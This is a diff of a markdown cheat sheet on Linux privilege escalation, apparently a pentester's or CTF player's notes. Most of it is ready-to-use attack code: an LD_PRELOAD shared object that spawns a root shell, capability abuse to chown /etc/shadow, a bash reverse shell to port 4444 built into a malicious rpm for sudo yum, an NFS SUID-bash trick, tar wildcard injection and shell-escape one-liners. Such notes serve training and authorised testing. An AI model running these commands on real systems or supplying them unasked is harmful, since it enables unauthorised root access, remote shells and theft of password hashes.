@@ -1,86 +1,82 @@
 # Linux Privilege Escalation
+## Misconfiguration
+- Find writable directories
+	`find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`
+- Find writable directories in PATH
+	`IFS=':'; read -a patharr <<< "$PATH"; for dir in ${patharr[@]}; do if [ -w $dir ]; then echo -e "$dir : WRITABLE"; fi; done;`
+- Find writable files
+	`find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`
+- Find suid binaries
+	`find / -perm /4000 2>/dev/null`
+- Find guid binaries
+	`find / -perm /2000 2>/dev/null`
+- Find binaries with capabilities
+	`getcap -r / 2>/dev/null`
+- Look for cronjob
+	`crontab -l`
+	`cat /etc/crontab`
+- Look for nfs exports
+	`cat /etc/exports`
 
-## Enumeration
-___
-### Files and folders
-- Look for writable directories
-```sh
-find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+## LD_PRELOAD
+If `env_keep += LD_PRELOAD` in sudoers:
+```bash
+$ cat << EOF > /tmp/shell.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setgid(0);
+	setuid(0);
+	system("/bin/sh");
+}
+EOF
+$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+$ ls -al shell.so
+$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/*****
+# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
-- Look for writable directories in PATH
-```sh
-IFS=':'; read -a patharr <<< "$PATH"; for dir in ${patharr[@]}; do if [ -w $dir ]; then echo -e "$dir : WRITABLE"; fi; done;
+## Capabilities
+### cap_setuid+ep
+- perl
+```perl
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/sh";
 ```
 
-- Look for writable files
-```sh
-find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+### cap_chown
+- python
+```python
+import os
+os.chown("/etc/shadow", 1000, 1000)
+```
+- ruby
+```ruby
+require 'fileutils'
+FileUtils.chown_R 'user', 'user', '/etc/shadow'
 ```
 
-- Look for group membership / special access
-```sh
-id
-find / -type f -group group_name 2> /dev/null
-```
-
-- Look for scripts/binaries with setuid
-```sh
-find / -perm -u=s -type f 2>/dev/null
-find / -perm /4000 2>/dev/null
-IFS=$'\n'$'\r'; for item in $(find / -perm /4000 2>/dev/null); do if [ -w $item ]; then echo -e "$item : WRITABLE"; fi; done;
-```
-
-- Look for scripts/binaries with setgid
-```sh
-find / -perm /2000 2>/dev/null
-IFS=$'\n'$'\r'; for item in $(find / -perm /2000 2>/dev/null); do if [ -w $item ]; then echo -e "$item : WRITABLE"; fi; done;
-```
-
-- Sneak into /var/log/audit
-```sh
-grep comm=\"su\" /var/log/audit/*
-```
-
-- Look for cap_setuid+ep
-```sh
-getcap -r / 2>/dev/null
-# /usr/bin/perl = cap_setuid+ep
-perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
-```
-
-### Cron jobs
-- Look for cron jobs executed as root
-```
-TODO
-```
-
-- Look for writable script/binaries from above cron jobs
-```
-TODO
-```
-
-### Binaries
-
+## Binaries
 - Look inside binaries for exploit possibilities
 ```
 strings /path/to/binary
 ```
 > If we find calls to an executable using relative path, we can create a malicious script using the binary name and update PATH to include the folder
 
-## Exploitation
-___
-
-### YUM
+## Local exploits
+### yum
 - Get a reverse shell using crafted rpm package
 
 If low priv user can run yum as root, we can craft a rpm package to get a reverse shell as root:
-```sh
+```bash
 # Create a script with reverse shell commands
-cat << EOF > root.sh
+# root.sh:
 #!/bin/bash
 bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'
-EOF
 
 # Then use fpm docker image to build the rpm:
 docker run --rm -v $(pwd):/data skandyla/fpm -n packagename -s dir -t rpm -a all --before-install /data/root.sh  -p /data /data
@@ -91,8 +87,7 @@ nc -lnvp 4444
 sudo yum install http://0.0.0.0:8000/root-1.0-1.noarch.rpm
 ```
 
-### NFS
-
+### nfs
 - Exploit rootsquash
 ```sh
 # Copy a bash binary to mounted NFS
@@ -105,36 +100,45 @@ chmod a+sx /mount/point/to/nfs/bash
 ./bash -p (in low privilege shell)
 ```
 
-### Wildcard Injection
-
-- Exploit tar with wildcard
+### tar
+- Exploit tar with wildcard injection
 ```sh
 # Example tar command: cd /folder; tar cf /backup.tgz *
 # Exploit this with checkpoint injection:
 cd /folder
-touch "--checkpoint=1"
-touch "--checkpoint-action=exec=sh shell.sh"
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
 # Wait for tar to run as root
 ```
 
-### Shell escape sequence
-| Tool | Escape Sequence |
-| --- | --- |
-| vi/vim | `:!/bin/bash`, `:set shell=/bin/bash:shell` |
-| awk | `awk 'BEGIN {system(\"/bin/bash\")}'` |
-| perl | `perl -e 'exec \"/bin/bash\";'` |
-| find | `find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;` |
-| nmap | `--interactive` |
+### pkexec
+See this writeup for THM's road
+https://wiki.thehacker.nz/docs/thm-writeups/road-medium/
 
-## Links
-___
-### Guides
+## Shell escape sequence
+| Tool   | Escape Sequence                                                 |
+| ------ | --------------------------------------------------------------- |
+| vi/vim | `:!/bin/bash`, `:set shell=/bin/bash:shell`                     |
+| awk    | `awk 'BEGIN {system(\"/bin/bash\")}'`                           |
+| perl   | `perl -e 'exec \"/bin/bash\";'`                                 |
+| find   | `find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;` |
+| nmap   | --interactive                                                   |                           
+
+
+## Tools
+- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+- https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
+- https://github.com/sleventyeleven/linuxprivchecker
+- https://github.com/rebootuser/LinEnum
+
+## Guides
 - https://book.hacktricks.xyz/linux-unix/privilege-escalation
 - https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks
 - https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 - https://gtfobins.github.io/
+- https://tbhaxor.com/exploiting-linux-capabilities-part-3/
 
-### Writeups
+## Writeups
 - https://blog.tryhackme.com/skynet-writeup/
 - https://s1gh.sh/tryhackme-wonderland/
